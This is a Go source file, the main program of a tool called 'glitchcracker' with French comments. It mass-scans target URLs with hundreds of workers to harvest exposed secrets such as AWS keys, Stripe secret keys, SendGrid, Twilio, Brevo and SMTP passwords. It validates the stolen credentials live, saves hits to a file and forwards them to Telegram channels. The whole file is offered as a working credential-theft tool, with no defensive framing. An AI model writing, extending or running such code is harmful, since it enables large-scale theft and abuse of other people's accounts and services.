package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"glitchcracker/internal/config"
	"glitchcracker/internal/i18n"
	"glitchcracker/internal/scanner"
	"glitchcracker/internal/telegram"
	"glitchcracker/internal/validator"
	"glitchcracker/pkg/models"
	"io"
	"log"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"
)

var debugLogger *log.Logger

func initDebugLog() {
	f, err := os.OpenFile("debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		debugLogger = log.New(os.Stderr, "[DEBUG] ", log.LstdFlags)
		return
	}
	multi := io.MultiWriter(f, os.Stderr)
	debugLogger = log.New(multi, "[DEBUG] ", log.LstdFlags|log.Lmicroseconds)
	debugLog("=== START ===")
}

func debugLog(format string, args ...interface{}) {
	if debugLogger != nil {
		debugLogger.Printf(format, args...)
	}
}

func pauseExit() {
	fmt.Println("\nAppuie sur Entrée pour fermer...")
	bufio.NewReader(os.Stdin).ReadString('\n')
}

func printBanner() {
	fmt.Println(`
  ██████╗ ██╗     ██╗████████╗ ██████╗██╗  ██╗
 ██╔════╝ ██║     ██║╚══██╔══╝██╔════╝██║  ██║
 ██║  ███╗██║     ██║   ██║   ██║     ███████║
 ██║   ██║██║     ██║   ██║   ██║     ██╔══██║
 ╚██████╔╝███████╗██║   ██║   ╚██████╗██║  ██║
  ╚═════╝ ╚══════╝╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝
 ██████╗ ██████╗   █████╗  ██████╗██╗  ██╗███████╗██████╗
██╔════╝ ██╔══██╗ ██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║      ██████╔╝ ███████║██║     █████╔╝ █████╗  ██████╔╝
██║      ██╔══██╗ ██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
╚██████╗ ██║  ██║ ██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
 ╚═════╝ ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝`)
	fmt.Println()
}

func main() {
	initDebugLog()
	printBanner()
	debugLog("Chargement config.json")

	cfg, err := config.LoadConfig("config.json")
	if err != nil {
		debugLog("CRITICAL: Erreur config: %v", err)
		fmt.Printf("  [!] CRITICAL: Error loading config.json: %v\n", err)
		pauseExit()
		return
	}

	i18n.SetLanguage(cfg.Language)

	fmt.Printf("  ┌─────────────────────────────────────┐\n")
	fmt.Printf("  │  %-35s│\n", fmt.Sprintf("Workers  : %d", cfg.Workers))
	fmt.Printf("  │  %-35s│\n", fmt.Sprintf("Timeout  : %ds", cfg.Timeout))
	fmt.Printf("  │  %-35s│\n", fmt.Sprintf("Input    : %s", cfg.InputDir))
	fmt.Printf("  │  %-35s│\n", fmt.Sprintf("Validate : %v", cfg.Validate))
	fmt.Printf("  │  %-35s│\n", fmt.Sprintf("Telegram : %v", cfg.Telegram.Enabled))
	fmt.Printf("  └─────────────────────────────────────┘\n\n")

	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer cancel()

	workerCount := cfg.Workers
	if workerCount <= 0 {
		workerCount = 500
	}

	eng := scanner.NewEngine(workerCount, time.Duration(cfg.Timeout)*time.Second, cfg.ExtraPaths)

	tg := telegram.NewService(
		cfg.Telegram.Token,
		cfg.Telegram.ValidChannelID,
		cfg.Telegram.InvalidChannelID,
		cfg.Telegram.StatsChannelID,
	)

	// ── PHASE 1 : Sharding
	fmt.Printf("  [*] Indexation des cibles...\n")
	loadStart := time.Now()

	if err := eng.ScanDir(ctx, cfg.InputDir); err != nil {
		fmt.Printf("  [!] Erreur: %v\n", err)
		pauseExit()
		return
	}

	totalURLs := eng.TotalURLs.Load()
	fmt.Printf("  [+] %d URLs indexées en %v\n\n", totalURLs, time.Since(loadStart).Round(time.Millisecond))
	fmt.Printf("  [*] Scan démarré (%d workers)...\n\n", workerCount)

	// ── PHASE 2 : Scan
	startTime := time.Now()
	eng.Start(ctx)

	// ── Pipeline validation
	rawResults := make(chan models.ScrapingResult, 100000)
	var processedKeys sync.Map
	var validationWg sync.WaitGroup

	for i := 0; i < 50; i++ {
		validationWg.Add(1)
		go func() {
			defer validationWg.Done()
			for res := range rawResults {
				uniqueKey := strings.TrimSpace(
					res.AKIA + res.SendGridApiKey + res.StripeSecretKey +
						res.TwilioAccountSid + res.SmtpPass + res.BrevoApiKey + res.SecretKey,
				)
				if uniqueKey != "" {
					if _, loaded := processedKeys.LoadOrStore(uniqueKey, true); loaded {
						continue
					}
				}

				if cfg.Validate {
					validation := validator.Validate(&res)
					res.Status = "invalid"
					if validation.Valid {
						res.Status = "valid"
						debugLog("VALID: %v | %s | %s", res.Services, res.Url, validation.Message)
						fmt.Printf("\n  [✓] VALID %-12s | %s\n", strings.Join(res.Services, "/"), validation.Message)
					}
					res.ValidationMsg = validation.Message
				}

				if cfg.Telegram.Enabled {
					go func(r models.ScrapingResult) {
						ctxT, cancelT := context.WithTimeout(context.Background(), 5*time.Second)
						defer cancelT()
						done := make(chan error, 1)
						go func() { done <- tg.SendHit(r) }()
						select {
						case <-done:
						case <-ctxT.Done():
						}
					}(res)
				}

				logHitToFile(res)
			}
		}()
	}

	// Transfert engine → rawResults + signal fin
	scanDone := make(chan struct{})
	go func() {
		for result := range eng.ResultsChan {
			select {
			case rawResults <- result:
			default:
				debugLog("rawResults plein, résultat perdu")
			}
		}
		close(rawResults)
		close(scanDone)
	}()

	// ── Monitor
	ticker := time.NewTicker(1 * time.Second)
	statsTicker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	defer statsTicker.Stop()

	// Moyenne glissante sur 10s pour URL/s et ETA stables
	const windowSize = 10
	urlHistory := make([]int64, 0, windowSize+1)
	pathCount := int64(len(eng.ExtraPaths) + 1)
	if pathCount <= 0 {
		pathCount = 1
	}

monitorLoop:
	for {
		select {
		case <-ticker.C:
			processed := eng.Processed.Load()
			hits := eng.TotalHits.Load()

			// URLs traitées = requêtes / nombre de paths
			doneURLs := processed / pathCount

			// Historique pour moyenne glissante
			urlHistory = append(urlHistory, doneURLs)
			if int64(len(urlHistory)) > windowSize+1 {
				urlHistory = urlHistory[1:]
			}

			// URLs/sec stable sur la fenêtre
			urlsPerSec := 0.0
			if len(urlHistory) >= 2 {
				delta := urlHistory[len(urlHistory)-1] - urlHistory[0]
				urlsPerSec = float64(delta) / float64(len(urlHistory)-1)
			}

			// Pourcentage basé sur URLs
			pct := 0.0
			if totalURLs > 0 {
				pct = float64(doneURLs) * 100.0 / float64(totalURLs)
				if pct > 100 {
					pct = 100
				}
			}

			// ETA stable
			etaStr := "--:--:--"
			if urlsPerSec > 1 && totalURLs > doneURLs {
				remaining := float64(totalURLs-doneURLs) / urlsPerSec
				etaStr = formatDuration(remaining)
			}

			bar := progressBar(pct, 20)
			fmt.Printf("\r  %s %5.1f%% | URL %d/%d | HITS %-5d | %5.0f URL/s | ETA %s   ",
				bar, pct, doneURLs, totalURLs, hits, urlsPerSec, etaStr)

			if totalURLs > 0 && doneURLs >= totalURLs {
				debugLog("Scan terminé automatiquement")
				break monitorLoop
			}

		case <-statsTicker.C:
			if cfg.Telegram.Enabled && cfg.Telegram.StatsChannelID != "" {
				go func() {
					processed := eng.Processed.Load()
					hits := eng.TotalHits.Load()
					elapsed := time.Since(startTime).Seconds()
					urlsPerSec := 0.0
					if elapsed > 0 {
						urlsPerSec = float64(processed/pathCount) / elapsed
					}
					tg.SendStats(int(processed/pathCount), int(totalURLs), int(hits), urlsPerSec*60)
				}()
			}

		case <-scanDone:
			debugLog("ResultsChan fermé — scan terminé")
			break monitorLoop

		case <-ctx.Done():
			debugLog("Arrêt signal")
			break monitorLoop
		}
	}

	fmt.Printf("\n\n  [*] Arrêt en cours...\n")
	eng.Stop()
	validationWg.Wait()

	elapsed := time.Since(startTime)
	hits := eng.TotalHits.Load()
	doneURLs := eng.Processed.Load() / pathCount
	debugLog("=== FIN: %d hits en %v ===", hits, elapsed)

	fmt.Printf("\n  ┌─────────────────────────────────────┐\n")
	fmt.Printf("  │  %-35s│\n", fmt.Sprintf("Hits     : %d", hits))
	fmt.Printf("  │  %-35s│\n", fmt.Sprintf("Durée    : %v", elapsed.Round(time.Second)))
	fmt.Printf("  │  %-35s│\n", fmt.Sprintf("URLs     : %d / %d", doneURLs, totalURLs))
	fmt.Printf("  └─────────────────────────────────────┘\n\n")

	pauseExit()
}

func formatDuration(seconds float64) string {
	s := int(seconds)
	h := s / 3600
	m := (s % 3600) / 60
	sec := s % 60
	return fmt.Sprintf("%02d:%02d:%02d", h, m, sec)
}

func progressBar(pct float64, length int) string {
	if pct < 0 {
		pct = 0
	}
	if pct > 100 {
		pct = 100
	}
	filled := int(pct / 100 * float64(length))
	bar := "["
	for i := 0; i < filled; i++ {
		bar += "█"
	}
	for i := filled; i < length; i++ {
		bar += "░"
	}
	bar += "]"
	return bar
}

func logHitToFile(res models.ScrapingResult) {
	f, err := os.OpenFile("hits.jsonl", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	jsonData, _ := json.Marshal(res)
	f.Write(append(jsonData, '\n'))
}
